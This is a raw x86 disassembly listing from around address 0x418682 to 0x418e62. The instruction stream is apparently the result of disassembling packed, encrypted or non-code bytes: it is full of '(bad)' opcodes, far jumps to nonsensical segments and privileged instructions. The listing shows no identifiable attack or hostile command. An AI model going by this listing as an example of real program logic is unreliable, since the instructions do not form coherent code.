  418682:	lods   eax,DWORD PTR ds:[esi]
  418683:	mov    al,ds:0xaa7b8579
  418688:	inc    edi
  418689:	popa   
  41868a:	leave  
  41868b:	xchg   edi,eax
  41868c:	mov    dl,0x74
  41868e:	ror    BYTE PTR [ebp+0x4d6640f7],1
  418694:	xchg   edx,eax
  418696:	sbb    al,0xef
  418698:	mov    dl,0x3c
  41869a:	push   ebx
  41869b:	mov    al,0x21
  41869d:	mov    ds:0x68b8048c,eax
  4186a2:	jmp    0x8f64:0x2fb20cb8
  4186a9:	aad    0x6a
  4186ab:	stos   DWORD PTR es:[edi],eax
  4186ac:	xchg   esi,eax
  4186ad:	jae    0x418688
  4186af:	sub    eax,0x7d7961de
  4186b4:	fdiv   st(1),st
  4186b6:	or     edi,DWORD PTR gs:[edx+0x77]
  4186ba:	dec    esp
  4186bb:	mov    edi,ecx
  4186bd:	dec    edx
  4186be:	inc    edx
  4186bf:	rcr    DWORD PTR [esi-0x58],1
  4186c2:	outs   dx,DWORD PTR ds:[esi]
  4186c3:	xor    eax,0x21f593f1
  4186c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186c9:	aad    0x67
  4186cb:	adc    edx,DWORD PTR [ecx-0x7a422763]
  4186d1:	gs pop ecx
  4186d3:	add    BYTE PTR [esi],0x0
  4186d6:	rcr    DWORD PTR [ebx+0x6f],0x78
  4186da:	inc    ecx
  4186db:	test   DWORD PTR [eax],0x23a80840
  4186e1:	or     DWORD PTR [ecx-0x43],0xeaeaee23
  4186e8:	retf   0x7995
  4186eb:	sbb    edi,DWORD PTR [edi-0x61]
  4186ee:	gs push ebx
  4186f0:	mov    ds:0x9b441d09,eax
  4186f5:	ror    DWORD PTR [ebx+0x6f],1
  4186f8:	aas    
  4186f9:	jp     0x418756
  4186fb:	pusha  
  4186fc:	push   edi
  4186fd:	jl     0x4186fd
  4186ff:	retf   
  418700:	inc    ecx
  418701:	test   eax,0xb4d0a428
  418706:	jecxz  0x4186ca
  418708:	mov    ds:0xdf4a4963,eax
  41870d:	addr16 addr16 cld 
  418710:	(bad)  
  418711:	fs mov ecx,0xa6ba7f99
  418717:	xchg   ebx,eax
  418718:	call   0xfff33f2a
  41871d:	ret    
  41871e:	popa   
  41871f:	cmc    
  418720:	or     BYTE PTR [ebx],bh
  418722:	push   esp
  418723:	push   0x22
  418725:	inc    ebx
  418726:	mov    dh,0x80
  418728:	dec    ecx
  418729:	pop    es
  41872a:	sbb    DWORD PTR [ebx],edi
  41872c:	sub    BYTE PTR [esi+0x202612c9],0xea
  418733:	cmp    eax,0xca7cd212
  418738:	push   0xc91fd3e4
  41873d:	retf   
  41873e:	cmp    BYTE PTR [ebx],ah
  418740:	daa    
  418741:	mul    BYTE PTR [eax+0x43a51841]
  418747:	int3   
  418748:	(bad)  
  418749:	sub    bl,al
  41874b:	xor    bh,BYTE PTR [ecx]
  41874d:	xchg   bl,bh
  41874f:	and    BYTE PTR [esp+ebx*1],dl
  418752:	sub    bl,BYTE PTR [eax-0x5e]
  418755:	pop    ss
  418756:	sub    al,0x39
  418758:	jg     0x41878c
  41875a:	pop    edx
  41875b:	imul   edx,edx,0xffffffea
  41875e:	sbb    edi,DWORD PTR [esi+ebx*1-0x12cc73a]
  418765:	xchg   ebx,eax
  418766:	out    0xe9,eax
  418768:	or     eax,0x5090e178
  41876d:	xchg   edi,eax
  41876e:	cmp    eax,0x42bc88d9
  418773:	enter  0x1fd4,0x43
  418777:	inc    edx
  418778:	xor    ebp,esp
  41877a:	sbb    ch,cl
  41877c:	lds    edi,FWORD PTR [ebp-0x62573b6a]
  418782:	jp     0x4187dc
  418784:	iret   
  418785:	push   edi
  418786:	xchg   esi,eax
  418787:	push   ss
  418788:	sar    BYTE PTR [ebx+0x24],1
  41878b:	inc    eax
  41878c:	push   esp
  41878d:	mov    ecx,0x7ca213dd
  418792:	xchg   edi,eax
  418793:	icebp  
  418794:	inc    esp
  418795:	pop    ebp
  418796:	outs   dx,BYTE PTR ds:[esi]
  418797:	sbb    bl,dl
  418799:	sub    BYTE PTR [eax+esi*4+0x5ee1523c],dh
  4187a0:	pop    ebp
  4187a1:	pop    ebx
  4187a2:	mov    al,0xd2
  4187a4:	jg     0x41874d
  4187a6:	jp     0x418743
  4187a8:	leave  
  4187a9:	cmc    
  4187aa:	inc    esi
  4187ab:	mov    DWORD PTR [esi+0xc0b665],edi
  4187b1:	dec    ecx
  4187b2:	or     ebp,DWORD PTR [edi+0x634bea8c]
  4187b8:	aas    
  4187b9:	xchg   DWORD PTR [ebp-0x3e],edx
  4187bc:	cwde   
  4187bd:	arpl   WORD PTR [ebx+0x63f72c7d],bp
  4187c3:	daa    
  4187c4:	jo     0x418842
  4187c6:	je     0x4187a8
  4187c8:	lahf   
  4187c9:	jnp    0x41874c
  4187cb:	jns    0x418763
  4187cd:	outs   dx,DWORD PTR gs:[esi]
  4187cf:	pop    edi
  4187d0:	pop    ecx
  4187d1:	jno    0x418827
  4187d3:	mov    esi,edi
  4187d5:	pop    ebp
  4187d6:	mov    ebx,0x21470b67
  4187db:	inc    BYTE PTR [edx-0x392d01ea]
  4187e1:	adc    BYTE PTR [ebx],0x9c
  4187e4:	lods   al,BYTE PTR ds:[esi]
  4187e5:	and    BYTE PTR [ebx],0x68
  4187e8:	fdivr  QWORD PTR gs:[ecx+0x2d]
  4187ec:	sar    DWORD PTR [ebx-0x55],1
  4187ef:	jne    0x4187c1
  4187f1:	fldcw  WORD PTR [ebx]
  4187f3:	pop    ds
  4187f4:	and    al,0x80
  4187f6:	scas   al,BYTE PTR es:[edi]
  4187f7:	in     eax,0x85
  4187f9:	or     al,0x6d
  4187fc:	and    edi,DWORD PTR [esi-0x34]
  4187ff:	mov    esi,0xf62d5e4a
  418804:	pop    eax
  418805:	ror    DWORD PTR [eax-0x4302d7d4],0x9b
  41880c:	mov    al,ds:0xd44dec19
  418811:	daa    
  418812:	mov    esi,0xc5d5875b
  418817:	push   edi
  418818:	or     bl,BYTE PTR [esi]
  41881a:	mov    dh,0xc
  41881c:	push   0xffffffc7
  41881e:	sbb    esp,ecx
  418820:	push   0x1e
  418822:	dec    ecx
  418823:	mov    edi,0xc6a9f2e9
  418828:	dec    ecx
  418829:	sbb    ah,al
  41882b:	jns    0x418828
  41882d:	cwde   
  41882e:	push   ds
  41882f:	sbb    esp,DWORD PTR [edx+0x5429f242]
  418835:	lock jb 0x418806
  418838:	sar    DWORD PTR [eax+esi*1-0x2e58beac],1
  41883f:	hlt    
  418840:	mov    esp,0x71dae199
  418845:	dec    eax
  418846:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418847:	fwait
  418848:	test   al,0x99
  41884a:	(bad)  
  41884b:	in     al,0xa0
  41884d:	push   esi
  41884e:	xchg   bh,bl
  418850:	xor    al,0x41
  418852:	dec    esp
  418853:	sub    al,0x9e
  418855:	addr16 dec esp
  418857:	imul   edx,ebx,0xffffff9f
  41885a:	ret    
  41885b:	addr16 dec ebp
  41885d:	or     bh,BYTE PTR [edi+edi*1]
  418860:	jae    0x4188d5
  418862:	test   BYTE PTR [ebx-0xa],bh
  418865:	pop    ebp
  418866:	nop
  418867:	mov    eax,0xf29a18d4
  41886c:	ins    BYTE PTR es:[edi],dx
  41886d:	repnz loop 0x418821
  418870:	adc    DWORD PTR [edi],0xe5c565ad
  418876:	or     bh,BYTE PTR [esi-0x58]
  418879:	clc    
  41887a:	int3   
  41887b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41887c:	dec    ebp
  41887d:	data16 jg 0x418823
  418880:	add    ebp,edi
  418882:	push   0xa4278577
  418887:	lahf   
  418888:	jae    0x418840
  41888a:	mov    esi,0xb649d0a5
  41888f:	jmp    0xaa39:0xe84c4140
  418896:	aam    0x2a
  418898:	sbb    BYTE PTR [esi-0x415c1eaf],dh
  41889e:	cli    
  41889f:	test   al,0xf0
  4188a1:	mov    cl,0x5f
  4188a3:	ins    BYTE PTR es:[edi],dx
  4188a4:	pop    edi
  4188a5:	xor    eax,0x6a610282
  4188aa:	sub    dh,ch
  4188ac:	sti    
  4188ad:	(bad)  [esi]
  4188af:	imul   ebx,DWORD PTR [ecx+ebp*1-0x6d32218d],0x63
  4188b7:	sbb    bh,al
  4188b9:	push   ecx
  4188ba:	mov    esp,0x64b1f379
  4188bf:	mov    WORD PTR [esi],?
  4188c1:	(bad)  
  4188c2:	mov    ah,0x68
  4188c4:	mov    DWORD PTR [esi+0xd5e01b7],ebx
  4188ca:	dec    ecx
  4188cb:	sbb    DWORD PTR [ebp+0x24],ecx
  4188ce:	add    BYTE PTR [ebx-0x3f],bl
  4188d1:	ins    BYTE PTR es:[edi],dx
  4188d2:	inc    eax
  4188d3:	cmp    esp,DWORD PTR [eax]
  4188d5:	cli    
  4188d6:	fld    TBYTE PTR [eax]
  4188d8:	jp     0x4188c0
  4188da:	loop   0x4188f5
  4188dc:	out    0x90,al
  4188de:	mov    di,0x20f1
  4188e2:	fwait
  4188e3:	test   BYTE PTR [ebp+0x5c],al
  4188e6:	jg     0x41890f
  4188e8:	jecxz  0x4188f7
  4188ea:	dec    edi
  4188eb:	popa   
  4188ec:	sbb    eax,0xbdd93355
  4188f1:	fst    st(7)
  4188f3:	lods   al,BYTE PTR ds:[esi]
  4188f4:	mov    ebp,0x3cdbd0d2
  4188f9:	gs fsub st,st(4)
  4188fc:	test   al,0x48
  4188ff:	jo     0x418910
  418901:	(bad)  
  418902:	dec    edi
  418903:	std    
  418904:	cdq    
  418905:	shl    DWORD PTR [ecx-0x22904939],1
  41890b:	fwait
  41890c:	ret    0x630f
  41890f:	mov    bl,dh
  418911:	inc    eax
  418912:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418913:	out    0x5c,al
  418915:	dec    ecx
  418916:	cmc    
  418917:	push   eax
  418918:	ret    0xa251
  41891b:	xchg   BYTE PTR [ecx-0x1e],al
  41891e:	leave  
  41891f:	mov    ds:0xeda2b7a4,eax
  418924:	push   ds
  418925:	fld    QWORD PTR [esi-0x23]
  418928:	jmp    esi
  41892a:	xor    al,dl
  41892c:	shl    DWORD PTR [edx+0x4c],0xf2
  418930:	inc    edi
  418931:	sar    ch,cl
  418933:	pop    es
  418934:	into   
  418935:	or     DWORD PTR [eax],edx
  418937:	fwait
  418938:	ror    ecx,cl
  41893a:	icebp  
  41893b:	adc    ecx,ebx
  41893d:	lods   al,BYTE PTR ds:[esi]
  41893e:	jne    0x41891c
  418940:	in     al,0x50
  418942:	les    ecx,FWORD PTR [ebp+0x7b666717]
  418948:	in     al,0x68
  41894a:	sbb    eax,0xd6ae81be
  41894f:	pop    es
  418950:	sbb    eax,0x40f4d258
  418955:	xlat   BYTE PTR ds:[ebx]
  418956:	mov    cl,0x27
  418958:	mov    esp,0xfb45456a
  41895d:	push   ebx
  41895e:	pop    edi
  41895f:	repz sahf 
  418961:	dec    ebx
  418962:	push   cs
  418963:	leave  
  418964:	mov    esp,0x6e787acc
  418969:	or     eax,0xc2aaf238
  41896e:	(bad)  
  41896f:	mov    cl,0x37
  418971:	ret    
  418972:	mov    edx,0x220d945a
  418977:	jecxz  0x4188fb
  418979:	sbb    al,BYTE PTR [ecx+0x54]
  41897c:	retf   
  41897d:	xchg   esi,eax
  41897e:	scas   eax,DWORD PTR es:[edi]
  41897f:	inc    ebx
  418980:	loope  0x418937
  418982:	sti    
  418983:	ins    DWORD PTR es:[edi],dx
  418984:	pop    ss
  418985:	pop    esi
  418986:	retf   0x5545
  418989:	jg     0x418964
  41898b:	and    bl,bl
  41898d:	out    0x8b,al
  41898f:	(bad)  
  418990:	mov    BYTE PTR [edi-0x3dd66a19],0xe8
  418997:	repz js 0x418a15
  41899a:	loop   0x4189f9
  41899c:	addr16 in al,dx
  41899e:	jae    0x4189bc
  4189a0:	cmp    eax,0xad1b11e9
  4189a5:	inc    eax
  4189a6:	mov    dh,0x75
  4189a8:	scas   al,BYTE PTR es:[edi]
  4189a9:	add    DWORD PTR [esi+0x4e],esp
  4189ac:	jb     0x4189e6
  4189ae:	adc    BYTE PTR [eax+0x44e80bb7],0xc9
  4189b5:	(bad)  
  4189b6:	(bad)  
  4189b7:	es cmc 
  4189b9:	sbb    ecx,DWORD PTR [esi-0xebad66f]
  4189bf:	cmp    DWORD PTR [ebx],edx
  4189c1:	mov    esi,0x843d1298
  4189c6:	enter  0x5da7,0xe7
  4189ca:	sub    DWORD PTR [eax],0x3d
  4189cd:	jmp    0x418998
  4189cf:	pop    ecx
  4189d0:	cmp    edx,DWORD PTR [ebx+0x265f976a]
  4189d6:	xor    esp,ebp
  4189d8:	mov    es,WORD PTR [eax-0x71bf9d2f]
  4189de:	and    ebx,ebx
  4189e0:	in     eax,dx
  4189e1:	rcl    BYTE PTR [edx-0x635357b8],1
  4189e7:	es jne 0x418a45
  4189ea:	add    eax,0x7fa15ca0
  4189ef:	das    
  4189f0:	leave  
  4189f1:	push   eax
  4189f2:	xor    DWORD PTR [ebx+ebx*4],edx
  4189f5:	lock push ebp
  4189f7:	cmp    eax,0x3526da31
  4189fc:	or     ebx,ecx
  4189fe:	or     ah,0x20
  418a01:	xor    ah,BYTE PTR [ecx+0x3c]
  418a04:	ffreep st(0)
  418a06:	std    
  418a07:	inc    ecx
  418a08:	mov    ah,BYTE PTR [edi+edi*4-0x3d44429a]
  418a0f:	bound  edi,QWORD PTR [edi+0x74d07ce3]
  418a15:	imul   esp,DWORD PTR [bx+0x2c],0xcbf41a8d
  418a1d:	inc    eax
  418a1e:	xor    al,0xf9
  418a20:	retf   0x6864
  418a23:	ficom  WORD PTR [ebx-0x57e407cf]
  418a29:	cs das 
  418a2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a2c:	inc    edi
  418a2d:	xchg   ebp,eax
  418a2e:	mov    bl,0x3
  418a30:	test   BYTE PTR [edx+0x74bef050],dh
  418a36:	out    dx,al
  418a37:	call   0x7d81:0xac24e381
  418a3e:	data16 ins BYTE PTR es:[edi],dx
  418a40:	hlt    
  418a41:	push   0xd11dfaa0
  418a46:	mov    ah,0xca
  418a48:	or     al,0x3f
  418a4a:	repz in eax,0x22
  418a4d:	or     DWORD PTR [ebx+0x32905006],eax
  418a53:	dec    edx
  418a54:	test   BYTE PTR [edx+eiz*1+0x20],ah
  418a58:	mov    cl,0x38
  418a5a:	dec    ebp
  418a5b:	push   esi
  418a5c:	fidivr DWORD PTR [edi+0x4a]
  418a5f:	add    eax,0x267b95d9
  418a64:	lock gs ja 0x418a74
  418a68:	inc    esp
  418a69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a6a:	rcl    DWORD PTR [ebx],cl
  418a6c:	pop    esp
  418a6d:	test   BYTE PTR [edi],0x1e
  418a70:	dec    esp
  418a71:	or     ebp,eax
  418a73:	ret    0x882d
  418a76:	or     bh,BYTE PTR [ecx+0x5d872b1f]
  418a7c:	test   BYTE PTR ds:0xbb7a8046,cl
  418a82:	popf   
  418a83:	xchg   ecx,eax
  418a84:	mov    ebx,0xa73a8a59
  418a89:	and    al,0x10
  418a8b:	jae    0x418a83
  418a8d:	fs je  0x418ac2
  418a90:	inc    edx
  418a91:	cmp    ecx,ebp
  418a93:	and    BYTE PTR [eax+0x53],dl
  418a96:	rcl    BYTE PTR [edx-0x60],1
  418a99:	cmp    esp,0x502c663b
  418a9f:	pushf  
  418aa0:	out    0xb7,eax
  418aa2:	inc    esi
  418aa3:	mov    eax,ds:0xe20b57f1
  418aa8:	outs   dx,DWORD PTR ds:[esi]
  418aa9:	mov    eax,ds:0xc5fa76cf
  418aae:	sub    DWORD PTR [edi],0x1d
  418ab1:	lods   al,BYTE PTR ds:[esi]
  418ab2:	xor    eax,0xe8397b42
  418ab7:	addr16 dec esp
  418ab9:	cmp    BYTE PTR [edx-0x66],ah
  418abc:	jmp    0x418b26
  418abe:	mov    esi,0x12171b6c
  418ac3:	jae    0x418b1b
  418ac5:	aaa    
  418ac6:	(bad)  
  418ac8:	(bad)  
  418aca:	add    al,0x71
  418acc:	adc    bl,BYTE PTR [ebp-0xa]
  418acf:	add    eax,0xb6f0d1a2
  418ad4:	aas    
  418ad5:	cld    
  418ad6:	sub    DWORD PTR [edx+0x56a50d61],eax
  418adc:	mov    bl,0xe6
  418ade:	mov    eax,ds:0xed4c25c9
  418ae3:	mov    ebp,0xdbf6931
  418ae8:	pmulhw mm5,QWORD PTR [esi+esi*1-0x357ada16]
  418af0:	test   al,0x57
  418af2:	lods   al,BYTE PTR ds:[esi]
  418af3:	fs pop edx
  418af5:	adc    ebx,DWORD PTR [ebp-0x26ba05c0]
  418afb:	mov    edx,0x810aa1
  418b00:	lds    edi,FWORD PTR [edx]
  418b02:	add    ecx,edx
  418b04:	jmp    0x10834a25
  418b09:	jns    0x418b1b
  418b0b:	mov    bl,BYTE PTR [edi-0x18]
  418b0e:	add    al,0xd2
  418b10:	lods   al,BYTE PTR ds:[esi]
  418b11:	ss js  0x418ae1
  418b14:	pop    ebx
  418b16:	cmp    ecx,DWORD PTR [ebx+0x1f04d0f6]
  418b1c:	stc    
  418b1d:	inc    eax
  418b1e:	jg     0x418b0f
  418b20:	mov    ch,BYTE PTR [ecx]
  418b22:	addr16 dec ecx
  418b24:	ficom  DWORD PTR [edx]
  418b26:	jne    0x418b85
  418b28:	mov    ebp,0x95f5d191
  418b2d:	sub    bh,BYTE PTR [edx-0x9]
  418b30:	pop    ebp
  418b31:	mov    ecx,0xc16b710e
  418b36:	mov    edi,esp
  418b38:	outs   dx,DWORD PTR ds:[esi]
  418b39:	mov    ebp,0x42b1665b
  418b3e:	and    esp,esp
  418b40:	xchg   BYTE PTR [edx+edi*8-0x18],bh
  418b44:	lods   al,BYTE PTR ds:[esi]
  418b45:	xchg   ecx,eax
  418b46:	jg     0x418af2
  418b48:	sbb    al,0x46
  418b4a:	cmp    al,0x5a
  418b4c:	(bad)  
  418b4d:	addr16 push cs
  418b4f:	ins    DWORD PTR es:[edi],dx
  418b50:	arpl   WORD PTR [eax+0x251afc24],si
  418b56:	add    DWORD PTR [eax],eax
  418b58:	outs   dx,BYTE PTR ds:[esi]
  418b59:	xchg   ebp,eax
  418b5a:	pop    edx
  418b5b:	in     eax,dx
  418b5c:	cmc    
  418b5d:	dec    ecx
  418b5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b5f:	cmp    bh,BYTE PTR ds:0xff5db3ee
  418b65:	imul   ebx,ecx,0x797ff6ef
  418b6b:	sbb    DWORD PTR [esi-0x613eb162],0x1d
  418b72:	inc    ebx
  418b73:	push   es
  418b74:	dec    esi
  418b75:	adc    al,0xf5
  418b77:	mov    cl,0x76
  418b79:	retf   0x787b
  418b7c:	xlat   BYTE PTR ds:[ebx]
  418b7d:	xchg   edi,eax
  418b7e:	pop    esp
  418b7f:	adc    eax,0x68bed146
  418b84:	call   0x30f0:0x8ddb98c4
  418b8b:	call   0xeab2b6b9
  418b90:	jmp    0x418b53
  418b92:	xor    ch,BYTE PTR [edx]
  418b94:	test   al,0xca
  418b96:	stc    
  418b97:	ficom  DWORD PTR [esi]
  418b99:	xor    al,0x8d
  418b9b:	jp     0x418bdf
  418b9d:	fcmovnbe st,st(0)
  418b9f:	popa   
  418ba0:	mov    ch,0xc8
  418ba2:	or     dh,dh
  418ba4:	mov    ds:0xf6b03f59,eax
  418ba9:	pop    ebx
  418baa:	sub    edi,DWORD PTR [edx+eax*4+0x55]
  418bae:	jo     0x418bad
  418bb0:	mov    al,0x71
  418bb2:	clc    
  418bb3:	jno    0x418c1f
  418bb5:	ror    DWORD PTR [ebx-0x16b53793],0x3f
  418bbc:	fiadd  DWORD PTR [ebx-0x25cf9edd]
  418bc2:	sub    edx,ebp
  418bc4:	leave  
  418bc5:	bound  edi,QWORD PTR [ebx]
  418bc7:	(bad)  
  418bc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bca:	sub    al,0xb6
  418bcc:	mov    esp,DWORD PTR [esi+0x2a600a3d]
  418bd2:	inc    edx
  418bd3:	push   0xffffffcb
  418bd5:	pop    esi
  418bd6:	pushf  
  418bd7:	ins    BYTE PTR es:[edi],dx
  418bd8:	or     esp,ebx
  418bda:	aam    0x68
  418bdc:	shr    BYTE PTR [edi+0x114e07a6],0xb1
  418be3:	ret    0x4dbb
  418be6:	ror    BYTE PTR [ebx+0x5a],1
  418be9:	aad    0xe0
  418beb:	stos   DWORD PTR es:[edi],eax
  418bec:	popf   
  418bed:	jmp    0xaeab:0xb92979fd
  418bf4:	cs (bad) 
  418bf7:	pop    ecx
  418bf8:	sbb    DWORD PTR [edi],esp
  418bfa:	arpl   si,sp
  418bfc:	jecxz  0x418be6
  418bfe:	leave  
  418bff:	je     0x418c7c
  418c01:	dec    esi
  418c02:	in     eax,dx
  418c03:	jo     0x418b91
  418c05:	xchg   ebp,eax
  418c06:	and    al,0x65
  418c08:	into   
  418c09:	aam    0xac
  418c0b:	xchg   edx,eax
  418c0c:	cli    
  418c0d:	add    DWORD PTR [edx],eax
  418c0f:	outs   dx,BYTE PTR ds:[esi]
  418c10:	enter  0xd1b6,0x71
  418c14:	push   ecx
  418c15:	mov    al,ds:0xc10c1f4b
  418c1a:	mov    ebx,0xaca7d6b7
  418c1f:	lahf   
  418c20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c21:	addr16 xchg ecx,eax
  418c23:	adc    eax,0xd53bd073
  418c28:	mov    al,0x65
  418c2a:	pop    edx
  418c2b:	jae    0x418c66
  418c2d:	aas    
  418c2e:	inc    BYTE PTR [edx-0x181aab6]
  418c34:	lods   al,BYTE PTR ds:[esi]
  418c35:	ja     0x418c10
  418c37:	call   0x6b2f:0x1b33bbb6
  418c3e:	xor    DWORD PTR [ebx-0x726991b1],ebx
  418c44:	mov    cl,0xf6
  418c46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c47:	in     al,dx
  418c48:	and    edi,DWORD PTR [edi-0x2a900c94]
  418c4e:	out    0xec,eax
  418c50:	test   DWORD PTR [edi-0x397e63db],ebp
  418c56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c57:	not    DWORD PTR [ebp+0x433ab20b]
  418c5d:	pop    ss
  418c5e:	jg     0x418c68
  418c60:	hlt    
  418c61:	pop    esi
  418c62:	mov    dl,0x4c
  418c64:	dec    esp
  418c65:	aas    
  418c66:	ror    BYTE PTR [esi+0x714714c2],0x9f
  418c6d:	fsubr  QWORD PTR [edi-0x1e]
  418c70:	lds    ebp,FWORD PTR [esi]
  418c72:	ins    DWORD PTR es:[edi],dx
  418c73:	jp     0x418c85
  418c75:	es push 0x846ad100
  418c7b:	rcl    BYTE PTR [esi],1
  418c7d:	pop    ss
  418c7e:	or     BYTE PTR [eax],0xe5
  418c81:	(bad)  
  418c82:	mov    al,0x94
  418c84:	or     eax,0x12c4b781
  418c89:	or     al,0x5c
  418c8b:	jmp    0x418c6c
  418c8d:	(bad)  
  418c8e:	aaa    
  418c8f:	js     0x418d10
  418c91:	mov    edi,0xe9c2b0e2
  418c96:	mov    ds:0x23dec7f2,al
  418c9b:	pop    ecx
  418c9c:	xor    ah,ch
  418c9e:	nop    esp
  418ca1:	cmp    al,0xc3
  418ca3:	xchg   BYTE PTR [eax+0x7a73c4cb],bh
  418ca9:	mov    al,0x99
  418cab:	imul   ecx,edx,0xffffff84
  418cae:	aam    0xe9
  418cb0:	inc    esp
  418cb1:	cmp    eax,0x6d9b401b
  418cb6:	leave  
  418cb7:	neg    DWORD PTR [esi+0x4b]
  418cba:	mov    bl,0xda
  418cbc:	dec    ebx
  418cbd:	inc    ebp
  418cbe:	je     0x418c7c
  418cc0:	sbb    eax,0x9c36a5ac
  418cc5:	cli    
  418cc6:	jne    0x418d0c
  418cc8:	cwde   
  418cc9:	in     al,dx
  418cca:	dec    ebp
  418ccb:	inc    ecx
  418ccc:	and    dl,dl
  418cce:	mov    cl,0x8
  418cd0:	mov    DWORD PTR [ebx+0xe1c9a8a],eax
  418cd6:	mov    dh,0x7e
  418cd8:	xchg   esp,eax
  418cd9:	inc    ebx
  418cda:	jmp    0x831:0xc57cf215
  418ce1:	mov    ah,0x53
  418ce3:	sbb    BYTE PTR [edx+0x30],al
  418ce6:	mov    al,0x7c
  418ce8:	sbb    al,bh
  418cea:	sbb    bh,dl
  418cec:	scas   eax,DWORD PTR es:[edi]
  418ced:	xchg   edi,eax
  418cee:	adc    al,0xb9
  418cf0:	ja     0x418d1b
  418cf2:	outs   dx,DWORD PTR ds:[esi]
  418cf3:	xchg   BYTE PTR [eax-0x13],bl
  418cf6:	stos   DWORD PTR es:[edi],eax
  418cf7:	push   ss
  418cf8:	push   esp
  418cf9:	or     BYTE PTR [ebx-0x18cf303a],dh
  418cff:	or     ch,BYTE PTR [eax+0x60]
  418d02:	sub    DWORD PTR [eax+0x5f],edx
  418d05:	jge    0x418d61
  418d07:	out    dx,al
  418d08:	(bad)  
  418d09:	lea    ecx,ds:0xc5cd5fc4
  418d0f:	das    
  418d10:	push   ebp
  418d11:	dec    esi
  418d12:	js     0x418d3e
  418d14:	imul   esp,DWORD PTR ds:0xa7e7f6f8,0x3a
  418d1b:	icebp  
  418d1c:	stc    
  418d1d:	shl    DWORD PTR [ebp-0x64],0xf2
  418d21:	je     0x418d14
  418d23:	addr16 fwait
  418d25:	push   ds
  418d26:	jmp    0x8314:0x3c17145e
  418d2d:	mov    ebp,eax
  418d2f:	push   ds
  418d30:	sbb    ecx,DWORD PTR [ebx-0x4371306f]
  418d36:	(bad)
  418d39:	les    eax,FWORD PTR [edx-0x5639ef6c]
  418d3f:	pop    es
  418d40:	add    esi,DWORD PTR [eax+ebp*2]
  418d43:	ret    0xbece
  418d46:	(bad)  
  418d47:	mov    ah,dl
  418d49:	loope  0x418d89
  418d4b:	adc    BYTE PTR [ebx+eiz*4],al
  418d4e:	daa    
  418d4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d50:	mov    esp,DWORD PTR [edi-0x7f]
  418d53:	or     DWORD PTR [ecx+eax*2-0xc443a8e],ebp
  418d5a:	mov    eax,ds:0xad4b5f9e
  418d5f:	(bad)  [ecx+0x2d]
  418d62:	ror    DWORD PTR ds:0x61efc1eb,0xe6
  418d69:	mov    esi,0x3c8a6ed
  418d6e:	sahf   
  418d6f:	std    
  418d70:	cdq    
  418d71:	jmp    0x418da1
  418d73:	adc    eax,0x5ebed63e
  418d78:	imul   eax,DWORD PTR [edi+0x20],0xffffffb7
  418d7c:	repz jg 0x418d0e
  418d7f:	and    BYTE PTR [esi+0x14684a17],bh
  418d85:	xchg   ebp,eax
  418d86:	xchg   edx,eax
  418d87:	mov    ds:0x11a56f57,eax
  418d8c:	pushf  
  418d8d:	pop    ss
  418d8e:	pop    ebp
  418d8f:	call   0x9e9e:0x4fd4c2d3
  418d96:	adc    al,0xf0
  418d98:	fcmovu st,st(0)
  418d9a:	mov    ebp,0x176c024a
  418d9f:	shl    edi,0xd5
  418da2:	in     al,dx
  418da3:	mov    ecx,0x3477f261
  418da8:	shl    BYTE PTR [eax-0x12c24581],0x1d
  418daf:	mov    ds:0x1b1c859b,al
  418db4:	outs   dx,BYTE PTR ds:[esi]
  418db5:	sbb    BYTE PTR [esi+ecx*4],bl
  418db8:	je     0x418e00
  418dba:	push   esp
  418dbb:	int3   
  418dbc:	sub    dl,BYTE PTR [esi+0x3afe10bc]
  418dc2:	(bad)  
  418dc3:	aam    0x81
  418dc5:	out    dx,al
  418dc6:	push   eax
  418dc7:	scas   al,BYTE PTR es:[edi]
  418dc8:	pop    eax
  418dc9:	push   ss
  418dca:	jno    0x418dc1
  418dcc:	test   al,0xd9
  418dce:	cmp    esi,DWORD PTR [edx-0x2b]
  418dd1:	repnz add al,0x57
  418dd4:	inc    esi
  418dd5:	xor    al,0xb3
  418dd7:	pop    ss
  418dd8:	cdq    
  418dd9:	inc    edi
  418dda:	sbb    eax,0x1af47ae8
  418ddf:	sbb    ebx,DWORD PTR [ebx+0x79c4d5dc]
  418de5:	aaa    
  418de6:	loop   0x418d9c
  418de8:	xlat   BYTE PTR ss:[ebx]
  418dea:	or     eax,0xab82ca33
  418def:	ret    
  418df0:	fsub   st,st(0)
  418df2:	dec    ebp
  418df3:	sbb    bl,BYTE PTR [eax-0x5605dd24]
  418df9:	mov    ah,0x22
  418dfb:	sub    DWORD PTR [edi+ebx*2+0x5fd5177c],ebp
  418e02:	repz enter 0xbf17,0x44
  418e07:	out    0x66,eax
  418e09:	adc    DWORD PTR [ebx+0x66dc1340],0xd5c40c0d
  418e13:	js     0x418e3c
  418e15:	ja     0x418ddf
  418e17:	test   eax,0x4740ab8e
  418e1c:	push   ebp
  418e1d:	mov    eax,ds:0xac3f8695
  418e22:	or     DWORD PTR [ebx+0x594d0523],0xe0db404e
  418e2c:	scas   al,BYTE PTR es:[edi]
  418e2d:	dec    ecx
  418e2e:	and    al,BYTE PTR [edi]
  418e30:	out    dx,al
  418e31:	popf   
  418e32:	mov    ?,WORD PTR [edi+eax*8-0x24]
  418e36:	add    al,0xd6
  418e38:	mov    bl,BYTE PTR [edi-0x12]
  418e3b:	and    BYTE PTR [edx-0x3b1cef7e],dh
  418e41:	sbb    dl,BYTE PTR [edx-0x1d460f0d]
  418e47:	rol    DWORD PTR [edx],cl
  418e49:	mov    cl,ah
  418e4b:	das    
  418e4c:	gs pop es
  418e4e:	test   eax,0xfe8aab4f
  418e53:	mov    al,0xa4
  418e55:	fwait
  418e56:	jg     0x418e81
  418e58:	rcl    BYTE PTR [eax+eax*8],1
  418e5b:	arpl   WORD PTR [ebp-0x73c9bfa3],cx
  418e61:	pop    ecx
  418e62:	jg     0x418dfc
